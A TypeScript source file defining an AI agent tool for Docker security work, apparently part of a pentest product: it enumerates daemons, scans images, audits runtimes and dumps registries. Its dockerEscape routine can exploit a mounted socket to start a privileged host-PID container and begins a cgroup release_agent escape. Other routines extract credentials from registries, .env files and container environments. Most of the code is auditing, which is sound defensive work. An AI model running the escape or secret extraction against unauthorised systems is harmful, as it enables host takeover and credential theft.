import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  docker_enum: {
    description:
      "Enumerate Docker daemon: containers, images, volumes, networks, registries, and daemon configuration. Checks for exposed API, insecure registries, and privileged containers",
    args: "[--socket PATH] [--host HOST]",
  },
  docker_escape: {
    description:
      "Detect and exploit Docker container escape vectors: mounted socket, privileged mode, SYS_ADMIN/SYS_PTRACE caps, cgroup release_agent, host PID/network namespace",
    args: "[--exploit] [--method <socket|cgroup|nsenter|procfs>]",
  },
  image_scan: {
    description:
      "Scan container images for vulnerabilities, embedded secrets, and misconfigurations. Checks Dockerfile history, environment variables, and layer contents",
    args: "--image IMAGE [--deep]",
  },
  registry_dump: {
    description:
      "Enumerate and extract images from Docker registries. Detects anonymous access, lists repositories and tags, pulls manifests and configs with embedded credentials",
    args: "--registry URL [--username USER] [--password PASS]",
  },
  runtime_audit: {
    description:
      "Audit container runtime security: AppArmor/SELinux profiles, seccomp filters, capability sets, read-only rootfs, resource limits, user namespace mapping",
    args: "[--container ID] [--all]",
  },
  compose_secrets: {
    description:
      "Extract secrets from Docker Compose files, .env files, and container environment variables. Scans for API keys, passwords, tokens, and connection strings",
    args: "[--path DIR]",
  },
  cleanup_container: {
    description:
      "Remove all CyberStrike-created containers, images, volumes, and networks (by label cyberstrike=true). ALWAYS run before leaving",
    args: "[--dry-run]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = {
  checkId: string
  provider: string
  severity: string
  status: string
  resource: string
  title: string
  details: string
  remediation: string
}
type HookResult = { output: string; findings: Finding[] }

// ── CLI helpers ──

async function run(
  cmd: string,
  args: string[],
  timeout: number,
): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  let proc: ReturnType<typeof Bun.spawn>
  try {
    proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  } catch (e) {
    return { stdout: "", stderr: e instanceof Error ? e.message : String(e), exitCode: 127 }
  }
  const ms = timeout * 1000
  let killed = false
  const timer = setTimeout(() => {
    killed = true
    proc.kill(9)
  }, ms)
  const reads = Promise.all([new Response(proc.stdout as ReadableStream).text(), new Response(proc.stderr as ReadableStream).text()])
  const [stdout, stderr] = await Promise.race([reads, new Promise<[string, string]>((r) => setTimeout(() => r(["", "(timed out)"]), ms + 2000))])
  clearTimeout(timer)
  const exitCode = killed ? 124 : await proc.exited
  return { stdout, stderr, exitCode }
}

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function hasFlag(args: string[], flag: string): boolean {
  return args.includes(flag)
}

function tryJson(s: string) {
  try {
    return JSON.parse(s)
  } catch {
    return null
  }
}

function docker(args: string[], socket: string | undefined, host: string | undefined, timeout: number) {
  const extra = [...(socket ? ["-H", `unix://${socket}`] : []), ...(host ? ["-H", host] : [])]
  return run("docker", [...extra, ...args], timeout)
}

// ── Programs ──

async function dockerEnum(args: string[], timeout: number): Promise<HookResult> {
  const socket = argVal(args, "--socket")
  const host = argVal(args, "--host")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Docker environment...\n"]

  const info = await docker(["info", "--format", "json"], socket, host, timeout)
  if (info.exitCode === 0) {
    const d = tryJson(info.stdout)
    if (d) {
      output.push(`[+] Docker version: ${d.ServerVersion}`)
      output.push(`    OS: ${d.OperatingSystem} (${d.Architecture})`)
      output.push(`    Containers: ${d.Containers} (running: ${d.ContainersRunning})`)
      output.push(`    Images: ${d.Images}`)
      output.push(`    Storage: ${d.Driver}`)
      output.push(`    Root dir: ${d.DockerRootDir}`)
      output.push(`    Security: ${(d.SecurityOptions || []).join(", ")}`)
      if (d.RegistryConfig?.InsecureRegistryCIDRs?.length > 1 || d.RegistryConfig?.IndexConfigs) {
        const insecure = Object.entries(d.RegistryConfig?.IndexConfigs || {})
          .filter(([, v]: [string, any]) => !v.Secure)
          .map(([k]) => k)
        if (insecure.length > 0) {
          findings.push({
            checkId: "CONT-ENUM-001",
            provider: "docker",
            severity: "high",
            status: "FAIL",
            resource: "docker://daemon",
            title: `Insecure registries configured: ${insecure.join(", ")}`,
            details: "Docker daemon allows HTTP connections to registries — images can be MITM'd",
            remediation: "Remove insecure registries from daemon.json",
          })
        }
      }
    }
  }
  if (info.exitCode !== 0) {
    output.push(`[!] Docker not accessible: ${info.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const containers = await docker(["ps", "-a", "--format", "json"], socket, host, timeout)
  if (containers.exitCode === 0) {
    const lines = containers.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Containers: ${lines.length}`)
    for (const line of lines) {
      const c = tryJson(line)
      if (!c) continue
      const priv = c.Labels?.includes("privileged") || false
      output.push(`    ${c.Names} (${c.Image}) — ${c.State} ${c.Status}${priv ? " [PRIVILEGED]" : ""}`)
      if (c.State === "running" && c.Ports) output.push(`      Ports: ${c.Ports}`)
    }
  }

  const images = await docker(["images", "--format", "json"], socket, host, timeout)
  if (images.exitCode === 0) {
    const lines = images.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Images: ${lines.length}`)
    for (const line of lines.slice(0, 20)) {
      const img = tryJson(line)
      if (img) output.push(`    ${img.Repository}:${img.Tag} — ${img.Size}`)
    }
  }

  const volumes = await docker(["volume", "ls", "--format", "json"], socket, host, timeout)
  if (volumes.exitCode === 0) {
    const lines = volumes.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Volumes: ${lines.length}`)
    for (const line of lines) {
      const v = tryJson(line)
      if (v) output.push(`    ${v.Name} (${v.Driver})`)
    }
  }

  const networks = await docker(["network", "ls", "--format", "json"], socket, host, timeout)
  if (networks.exitCode === 0) {
    const lines = networks.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Networks: ${lines.length}`)
    for (const line of lines) {
      const n = tryJson(line)
      if (n) output.push(`    ${n.Name} (${n.Driver}) — scope: ${n.Scope}`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function dockerEscape(args: string[], timeout: number): Promise<HookResult> {
  const exploit = hasFlag(args, "--exploit")
  const method = argVal(args, "--method")
  const findings: Finding[] = []
  const output: string[] = ["[*] Checking container escape vectors...\n"]

  const socketPaths = ["/var/run/docker.sock", "/run/docker.sock", "/.dockerenv"]
  for (const p of socketPaths) {
    const check = await run("test", ["-e", p], 5)
    if (check.exitCode === 0) {
      output.push(`[+] Found: ${p}`)
      if (p.includes("docker.sock")) {
        findings.push({
          checkId: "CONT-ESC-001",
          provider: "docker",
          severity: "critical",
          status: "FAIL",
          resource: `container://${p}`,
          title: "Docker socket mounted inside container",
          details: "Docker socket is accessible — full host escape via docker run --privileged",
          remediation: "Remove docker socket mount from container configuration",
        })
        if (exploit && (!method || method === "socket")) {
          output.push(`[!] Exploiting socket escape...`)
          const id = await run(
            "docker",
            [
              "-H",
              `unix://${p}`,
              "run",
              "-d",
              "--privileged",
              "--pid=host",
              "--label",
              "cyberstrike=true",
              "alpine",
              "sleep",
              "3600",
            ],
            timeout,
          )
          if (id.exitCode === 0) output.push(`[+] Privileged container spawned: ${id.stdout.trim().substring(0, 12)}`)
        }
      }
    }
  }

  const caps = await run("cat", ["/proc/1/status"], 5)
  if (caps.exitCode === 0) {
    const capEff = caps.stdout.match(/CapEff:\s*(\S+)/)?.[1]
    if (capEff) {
      const capNum = parseInt(capEff, 16)
      const isPrivileged = capNum === 0x3fffffffff || capNum === 0x1ffffffffff
      output.push(`\n[+] Effective capabilities: ${capEff}${isPrivileged ? " [PRIVILEGED/ALL CAPS]" : ""}`)
      if (isPrivileged) {
        findings.push({
          checkId: "CONT-ESC-002",
          provider: "docker",
          severity: "critical",
          status: "FAIL",
          resource: "container://self",
          title: "Container running with all capabilities (privileged)",
          details: `CapEff=${capEff} — container has full kernel capabilities`,
          remediation: "Remove --privileged flag and drop unnecessary capabilities",
        })
      }
      const SYS_ADMIN = 1 << 21
      if (capNum & SYS_ADMIN) output.push(`    SYS_ADMIN: YES — cgroup escape possible`)
      const SYS_PTRACE = 1 << 19
      if (capNum & SYS_PTRACE) output.push(`    SYS_PTRACE: YES — process injection possible`)
    }
  }

  const hostPid = await run("ls", ["/proc/1/root/etc/hostname"], 5)
  if (hostPid.exitCode === 0) output.push(`\n[+] Host filesystem accessible via /proc/1/root/`)

  const cgroup = await run("cat", ["/proc/1/cgroup"], 5)
  if (cgroup.exitCode === 0) {
    const inDocker = cgroup.stdout.includes("docker") || cgroup.stdout.includes("kubepods")
    output.push(`\n[+] Cgroup: ${inDocker ? "containerized" : "possibly host"}`)
    if (exploit && (!method || method === "cgroup")) {
      output.push(`[!] Attempting cgroup release_agent escape...`)
      const d = "/tmp/cs-cgroup"
      await run("mkdir", ["-p", d], 5)
      const mount = await run("mount", ["-t", "cgroup", "-o", "rdma", "cgroup", d], 10)
      if (mount.exitCode === 0)
        output.push(`[+] Cgroup mounted at ${d} — write release_agent for host command execution`)
      if (mount.exitCode !== 0) output.push(`[!] Cgroup mount failed (expected if not privileged)`)
    }
  }

  if (findings.length === 0) output.push(`\n[-] No obvious escape vectors found`)

  return { output: output.join("\n"), findings }
}

async function imageScan(args: string[], timeout: number): Promise<HookResult> {
  const image = argVal(args, "--image")
  const deep = hasFlag(args, "--deep")
  const findings: Finding[] = []
  const output: string[] = []

  if (!image) return { output: "[!] Required: --image IMAGE", findings }

  output.push(`[*] Scanning image: ${image}\n`)

  const history = await run("docker", ["history", "--no-trunc", "--format", "json", image], timeout)
  if (history.exitCode === 0) {
    const lines = history.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Image layers: ${lines.length}`)
    const secretPatterns = /(?:password|secret|api.?key|token|credential|aws.?access|private.?key)/i
    for (const line of lines) {
      const layer = tryJson(line)
      if (!layer) continue
      const cmd = layer.CreatedBy || ""
      if (secretPatterns.test(cmd)) {
        output.push(`    [!] Potential secret in layer: ${cmd.substring(0, 200)}`)
        findings.push({
          checkId: "CONT-IMG-001",
          provider: "docker",
          severity: "high",
          status: "FAIL",
          resource: `image://${image}`,
          title: "Potential secret in image layer",
          details: cmd.substring(0, 500),
          remediation: "Use multi-stage builds and Docker secrets instead of embedding secrets in layers",
        })
      }
    }
  }

  const inspect = await run("docker", ["inspect", image], timeout)
  if (inspect.exitCode === 0) {
    const data = tryJson(inspect.stdout)
    if (data?.[0]) {
      const config = data[0].Config || {}
      const env = config.Env || []
      output.push(`\n[+] Environment variables: ${env.length}`)
      const secretPatterns =
        /(?:password|secret|api.?key|token|credential|aws|private.?key|database.?url|connection.?string)/i
      for (const e of env) {
        if (secretPatterns.test(e)) {
          output.push(`    [!] ${e.substring(0, 200)}`)
          findings.push({
            checkId: "CONT-IMG-002",
            provider: "docker",
            severity: "high",
            status: "FAIL",
            resource: `image://${image}`,
            title: "Secret in image environment variable",
            details: e.substring(0, 500),
            remediation: "Remove secrets from ENV and use runtime injection",
          })
        }
      }
      if (config.User === "" || config.User === "root") {
        output.push(`\n[!] Image runs as root`)
        findings.push({
          checkId: "CONT-IMG-003",
          provider: "docker",
          severity: "medium",
          status: "FAIL",
          resource: `image://${image}`,
          title: "Container runs as root user",
          details: `User: ${config.User || "(default root)"}`,
          remediation: "Add USER directive to Dockerfile with non-root user",
        })
      }
      output.push(`\n[+] Exposed ports: ${Object.keys(config.ExposedPorts || {}).join(", ") || "none"}`)
      output.push(`    Entrypoint: ${JSON.stringify(config.Entrypoint)}`)
      output.push(`    Cmd: ${JSON.stringify(config.Cmd)}`)
    }
  }

  if (deep) {
    const save = await run("docker", ["save", image], timeout)
    if (save.exitCode === 0) {
      output.push(`\n[+] Deep scan: extracting layer contents for secret analysis...`)
      output.push(`    (Full layer extraction available — pipe to tar for manual review)`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function registryDump(args: string[], timeout: number): Promise<HookResult> {
  const registry = argVal(args, "--registry")
  const username = argVal(args, "--username")
  const password = argVal(args, "--password")
  const findings: Finding[] = []
  const output: string[] = []

  if (!registry) return { output: "[!] Required: --registry URL", findings }

  output.push(`[*] Enumerating registry: ${registry}\n`)

  const authHeader =
    username && password
      ? ["-H", `Authorization: Basic ${Buffer.from(`${username}:${password}`).toString("base64")}`]
      : []

  const catalog = await run("curl", ["-sk", `${registry}/v2/_catalog`, ...authHeader, "--max-time", "30"], timeout)
  if (catalog.exitCode === 0) {
    const data = tryJson(catalog.stdout)
    if (data?.repositories) {
      output.push(`[+] Repositories: ${data.repositories.length}`)
      if (!username) {
        findings.push({
          checkId: "CONT-REG-001",
          provider: "docker",
          severity: "critical",
          status: "FAIL",
          resource: `registry://${registry}`,
          title: "Registry allows anonymous catalog listing",
          details: `${data.repositories.length} repositories accessible without authentication`,
          remediation: "Enable authentication on the registry",
        })
      }
      for (const repo of data.repositories.slice(0, 30)) {
        const tags = await run(
          "curl",
          ["-sk", `${registry}/v2/${repo}/tags/list`, ...authHeader, "--max-time", "10"],
          timeout,
        )
        const tagData = tryJson(tags.stdout)
        const tagList = tagData?.tags || []
        output.push(
          `    ${repo}: ${tagList.length} tags — ${tagList.slice(0, 5).join(", ")}${tagList.length > 5 ? "..." : ""}`,
        )

        if (tagList.length > 0) {
          const tag = tagList[0]
          const manifest = await run(
            "curl",
            [
              "-sk",
              `${registry}/v2/${repo}/manifests/${tag}`,
              "-H",
              "Accept: application/vnd.docker.distribution.manifest.v2+json",
              ...authHeader,
              "--max-time",
              "10",
            ],
            timeout,
          )
          const mData = tryJson(manifest.stdout)
          if (mData?.config?.digest) {
            const blob = await run(
              "curl",
              ["-sk", `${registry}/v2/${repo}/blobs/${mData.config.digest}`, ...authHeader, "--max-time", "15"],
              timeout,
            )
            const config = tryJson(blob.stdout)
            if (config?.config?.Env) {
              const secretPatterns = /(?:password|secret|api.?key|token|credential|aws)/i
              for (const e of config.config.Env) {
                if (secretPatterns.test(e)) {
                  findings.push({
                    checkId: "CONT-REG-002",
                    provider: "docker",
                    severity: "high",
                    status: "EXTRACTED",
                    resource: `registry://${registry}/${repo}:${tag}`,
                    title: `Secret in image config: ${repo}:${tag}`,
                    details: e.substring(0, 300),
                    remediation: "Remove secrets from image environment variables",
                  })
                  output.push(`      [!] Secret in ${repo}:${tag}: ${e.substring(0, 100)}`)
                }
              }
            }
          }
        }
      }
    }
  }
  if (catalog.exitCode !== 0) {
    output.push(`[!] Registry not accessible: ${catalog.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function runtimeAudit(args: string[], timeout: number): Promise<HookResult> {
  const container = argVal(args, "--container")
  const all = hasFlag(args, "--all")
  const findings: Finding[] = []
  const output: string[] = ["[*] Auditing container runtime security...\n"]

  const targets: string[] = []
  if (container) {
    targets.push(container)
  } else if (all) {
    const ps = await run("docker", ["ps", "-q"], timeout)
    if (ps.exitCode === 0) targets.push(...ps.stdout.trim().split("\n").filter(Boolean))
  } else {
    const ps = await run("docker", ["ps", "-q", "--last", "5"], timeout)
    if (ps.exitCode === 0) targets.push(...ps.stdout.trim().split("\n").filter(Boolean))
  }

  output.push(`[+] Auditing ${targets.length} container(s)\n`)

  for (const id of targets) {
    const inspect = await run("docker", ["inspect", id], timeout)
    if (inspect.exitCode !== 0) continue
    const data = tryJson(inspect.stdout)
    if (!data?.[0]) continue
    const c = data[0]
    const name = c.Name?.replace(/^\//, "") || id.substring(0, 12)
    output.push(`\n── ${name} (${c.Config?.Image || "?"}) ──`)

    const hc = c.HostConfig || {}
    if (hc.Privileged) {
      output.push(`  [!] PRIVILEGED MODE`)
      findings.push({
        checkId: "CONT-RT-001",
        provider: "docker",
        severity: "critical",
        status: "FAIL",
        resource: `container://${name}`,
        title: `Privileged container: ${name}`,
        details: "Container has full host access",
        remediation: "Remove --privileged flag",
      })
    }
    if (hc.PidMode === "host") output.push(`  [!] Host PID namespace`)
    if (hc.NetworkMode === "host") output.push(`  [!] Host network namespace`)
    if (hc.IpcMode === "host") output.push(`  [!] Host IPC namespace`)

    const caps = hc.CapAdd || []
    if (caps.length > 0) output.push(`  Capabilities added: ${caps.join(", ")}`)
    const capDrop = hc.CapDrop || []
    output.push(`  Capabilities dropped: ${capDrop.length > 0 ? capDrop.join(", ") : "NONE"}`)
    if (capDrop.length === 0 && !hc.Privileged) {
      findings.push({
        checkId: "CONT-RT-002",
        provider: "docker",
        severity: "medium",
        status: "FAIL",
        resource: `container://${name}`,
        title: `No capabilities dropped: ${name}`,
        details: "Container retains all default capabilities",
        remediation: "Add --cap-drop ALL and only --cap-add required capabilities",
      })
    }

    output.push(`  AppArmor: ${hc.AppArmorProfile || "unconfined"}`)
    output.push(`  Seccomp: ${hc.SecurityOpt?.find((s: string) => s.includes("seccomp")) || "default"}`)
    output.push(`  Read-only rootfs: ${hc.ReadonlyRootfs ? "YES" : "NO"}`)
    output.push(`  User: ${c.Config?.User || "root"}`)
    output.push(`  Restart policy: ${hc.RestartPolicy?.Name || "no"}`)

    const mounts = c.Mounts || []
    if (mounts.length > 0) {
      output.push(`  Mounts: ${mounts.length}`)
      for (const m of mounts) {
        const sensitive = m.Source?.match(/\/(etc|root|var\/run|proc|sys|boot)/)
        output.push(`    ${m.Source} → ${m.Destination} (${m.Mode || "rw"})${sensitive ? " [SENSITIVE]" : ""}`)
        if (sensitive) {
          findings.push({
            checkId: "CONT-RT-003",
            provider: "docker",
            severity: "high",
            status: "FAIL",
            resource: `container://${name}`,
            title: `Sensitive host path mounted: ${m.Source}`,
            details: `${m.Source} → ${m.Destination} (${m.Mode || "rw"})`,
            remediation: "Remove sensitive host path mounts",
          })
        }
      }
    }

    const limits = hc.Memory || hc.NanoCpus || hc.PidsLimit
    output.push(`  Resource limits: ${limits ? "configured" : "NONE"}`)
    if (!limits) {
      findings.push({
        checkId: "CONT-RT-004",
        provider: "docker",
        severity: "low",
        status: "FAIL",
        resource: `container://${name}`,
        title: `No resource limits: ${name}`,
        details: "Container has no memory/CPU/PID limits — DoS risk",
        remediation: "Set --memory, --cpus, and --pids-limit",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

async function composeSecrets(args: string[], timeout: number): Promise<HookResult> {
  const searchPath = argVal(args, "--path") || "."
  const findings: Finding[] = []
  const output: string[] = [`[*] Scanning for container secrets in: ${searchPath}\n`]

  const secretPatterns =
    /(?:password|secret|api[_-]?key|token|credential|aws[_-]?access|private[_-]?key|database[_-]?url|connection[_-]?string|mysql|postgres|redis|mongo)[\s]*[=:]/i

  const composeFiles = await run(
    "find",
    [
      searchPath,
      "-maxdepth",
      "3",
      "-name",
      "docker-compose*.yml",
      "-o",
      "-name",
      "docker-compose*.yaml",
      "-o",
      "-name",
      "compose.yml",
      "-o",
      "-name",
      "compose.yaml",
    ],
    timeout,
  )
  if (composeFiles.exitCode === 0) {
    const files = composeFiles.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Compose files: ${files.length}`)
    for (const f of files) {
      const content = await run("cat", [f], 5)
      if (content.exitCode !== 0) continue
      const lines = content.stdout.split("\n")
      for (let i = 0; i < lines.length; i++) {
        if (secretPatterns.test(lines[i])) {
          output.push(`    [!] ${f}:${i + 1} — ${lines[i].trim().substring(0, 150)}`)
          findings.push({
            checkId: "CONT-SEC-001",
            provider: "docker",
            severity: "high",
            status: "FAIL",
            resource: `file://${f}`,
            title: `Secret in compose file: ${f}`,
            details: `Line ${i + 1}: ${lines[i].trim().substring(0, 300)}`,
            remediation: "Use Docker secrets or external secret management",
          })
        }
      }
    }
  }

  const envFiles = await run(
    "find",
    [searchPath, "-maxdepth", "3", "-name", ".env", "-o", "-name", ".env.*", "-o", "-name", "*.env"],
    timeout,
  )
  if (envFiles.exitCode === 0) {
    const files = envFiles.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Environment files: ${files.length}`)
    for (const f of files) {
      const content = await run("cat", [f], 5)
      if (content.exitCode !== 0) continue
      const lines = content.stdout.split("\n")
      for (let i = 0; i < lines.length; i++) {
        const line = lines[i].trim()
        if (line.startsWith("#") || !line.includes("=")) continue
        if (secretPatterns.test(line)) {
          output.push(`    [!] ${f}:${i + 1} — ${line.substring(0, 150)}`)
          findings.push({
            checkId: "CONT-SEC-002",
            provider: "docker",
            severity: "high",
            status: "EXTRACTED",
            resource: `file://${f}`,
            title: `Secret in env file: ${f}`,
            details: `Line ${i + 1}: ${line.substring(0, 300)}`,
            remediation: "Use a secrets manager instead of .env files",
          })
        }
      }
    }
  }

  const runningEnv = await run("docker", ["ps", "-q"], timeout)
  if (runningEnv.exitCode === 0) {
    const ids = runningEnv.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Checking env vars in ${ids.length} running container(s)`)
    for (const id of ids.slice(0, 10)) {
      const inspect = await run("docker", ["inspect", "--format", "{{.Name}} {{json .Config.Env}}", id], 10)
      if (inspect.exitCode !== 0) continue
      const name = inspect.stdout.split(" ")[0]?.replace(/^\//, "") || id
      const envStr = inspect.stdout.substring(inspect.stdout.indexOf("["))
      const env = tryJson(envStr) || []
      for (const e of env) {
        if (secretPatterns.test(e)) {
          output.push(`    [!] ${name}: ${(e as string).substring(0, 150)}`)
          findings.push({
            checkId: "CONT-SEC-003",
            provider: "docker",
            severity: "high",
            status: "EXTRACTED",
            resource: `container://${name}`,
            title: `Secret in container env: ${name}`,
            details: (e as string).substring(0, 300),
            remediation: "Use Docker secrets or volume-mounted secret files",
          })
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function cleanupContainer(_args: string[], timeout: number): Promise<HookResult> {
  const dryRun = hasFlag(_args, "--dry-run")
  const findings: Finding[] = []
  const output: string[] = ["[*] Cleaning up CyberStrike container resources...\n"]

  const containers = await run("docker", ["ps", "-a", "--filter", "label=cyberstrike=true", "-q"], timeout)
  if (containers.exitCode === 0) {
    const ids = containers.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] CyberStrike containers: ${ids.length}`)
    if (ids.length > 0 && !dryRun) {
      await run("docker", ["rm", "-f", ...ids], timeout)
      output.push(`    Removed ${ids.length} container(s)`)
    }
  }

  const images = await run("docker", ["images", "--filter", "label=cyberstrike=true", "-q"], timeout)
  if (images.exitCode === 0) {
    const ids = images.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] CyberStrike images: ${ids.length}`)
    if (ids.length > 0 && !dryRun) {
      await run("docker", ["rmi", "-f", ...ids], timeout)
      output.push(`    Removed ${ids.length} image(s)`)
    }
  }

  const volumes = await run("docker", ["volume", "ls", "--filter", "label=cyberstrike=true", "-q"], timeout)
  if (volumes.exitCode === 0) {
    const ids = volumes.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] CyberStrike volumes: ${ids.length}`)
    if (ids.length > 0 && !dryRun) {
      await run("docker", ["volume", "rm", ...ids], timeout)
      output.push(`    Removed ${ids.length} volume(s)`)
    }
  }

  const networks = await run("docker", ["network", "ls", "--filter", "label=cyberstrike=true", "-q"], timeout)
  if (networks.exitCode === 0) {
    const ids = networks.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] CyberStrike networks: ${ids.length}`)
    if (ids.length > 0 && !dryRun) {
      await run("docker", ["network", "rm", ...ids], timeout)
      output.push(`    Removed ${ids.length} network(s)`)
    }
  }

  if (dryRun) output.push(`\n[*] Dry run — no resources were removed`)

  return { output: output.join("\n"), findings }
}

// ── Tool definition ──

const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]

export const ContainerhookTool = Tool.define("containerhook", {
  description: `Execute a container security program for Docker/OCI runtime auditing, image scanning, registry enumeration, and container escape detection. Uses docker CLI (no Python dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_container before leaving.`,
  parameters: z.object({
    program: z.enum(programKeys).describe(
      "Container program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
  }),
  async execute(params) {
    const check = await run("which", ["docker"], 5)
    if (check.exitCode !== 0 && !["compose_secrets"].includes(params.program)) {
      return {
        title: `containerhook: ${params.program}`,
        output: "docker not found. Install: https://docs.docker.com/engine/install/",
        metadata: { program: params.program, findings: [] as Finding[] },
      }
    }

    const dispatch: Record<Program, () => Promise<HookResult>> = {
      docker_enum: () => dockerEnum(params.args, params.timeout_seconds),
      docker_escape: () => dockerEscape(params.args, params.timeout_seconds),
      image_scan: () => imageScan(params.args, params.timeout_seconds),
      registry_dump: () => registryDump(params.args, params.timeout_seconds),
      runtime_audit: () => runtimeAudit(params.args, params.timeout_seconds),
      compose_secrets: () => composeSecrets(params.args, params.timeout_seconds),
      cleanup_container: () => cleanupContainer(params.args, params.timeout_seconds),
    }

    try {
      const result = await dispatch[params.program]()
      return {
        title: `containerhook: ${params.program}`,
        output: result.output,
        metadata: { program: params.program, findings: result.findings },
      }
    } catch (e) {
      return {
        title: `containerhook: ${params.program}`,
        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
        metadata: { program: params.program, findings: [] },
      }
    }
  },
})
